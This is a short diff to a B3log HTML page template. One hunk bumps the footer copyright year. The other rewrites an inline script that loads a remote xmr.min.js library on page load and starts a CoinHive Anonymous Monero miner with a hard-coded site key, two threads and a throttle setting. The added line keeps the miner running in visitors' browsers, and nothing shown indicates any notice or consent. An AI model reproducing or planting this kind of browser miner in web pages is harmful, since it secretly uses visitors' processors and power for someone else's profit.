@@ -575,7 +575,7 @@
         <div class="left">
             <a href="http://b3log.org" title="B3log"><img src="../images/logo.png" title="B3log"/></a>
         </div>
-        平等 • 自由 • 奔放 <span class="ft-gray">© 2010-2017</span> <a href="http://b3log.org">B3log</a>
+        平等 • 自由 • 奔放 <span class="ft-gray">© 2010-2018</span> <a href="http://b3log.org">B3log</a>
     </div>
 </div>
 
@@ -597,8 +597,7 @@
     scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
     document.head.appendChild(scriptDom)
     scriptDom.onload = function () {
-      var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5});
-      miner.start();
+      (CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5})).start();
     }
   })();
 </script>
